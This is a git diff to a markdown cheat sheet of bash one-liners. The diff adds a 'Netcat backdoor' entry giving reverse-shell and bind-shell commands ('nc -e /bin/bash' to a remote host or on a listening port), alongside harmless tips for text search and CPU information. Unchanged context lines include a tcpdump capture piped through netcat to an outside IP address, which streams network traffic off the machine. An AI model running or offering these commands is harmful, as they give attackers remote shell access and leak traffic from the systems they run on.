@@ -89,12 +89,31 @@ grep -E -o '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}'
 tcpdump -w - | nc -v 8.8.8.8 9999
 ```
 
-**Recursively search for files within a directory**
+**Recursively search for text contained in files within a directory**
 ```bash
 zcat -rf ./* | grep "searchstring"
 ```
 
+**Recursively search for files with the specified word within them**
+*Submitted by cat on Google Fourms*
+```bash
+ls -a | find | grep -i "string"
+```
+
+**Netcat backdoor**
+*Does not work with most distro's default version of netcat (most do not define ENABLE_GAPING_SECURITY_HOLE which turns on -e)*
+```bash
+nc -e /bin/bash *remotecomputer* *port*
+OR
+nc -e /bin/bash -lp *port*
+```
+
+**View CPU Information**
+```bash
+cat /proc/cpuinfo
+```
+
 Credits
 -----------
-Credits to @TheAndrewBalls for posting some awsome one liners (the hidden SSH example and the DNS enumeration are both his contributions
+Credits to @TheAndrewBalls for posting some awsome one liners (the hidden SSH example and the DNS enumeration are both his contributions)
 
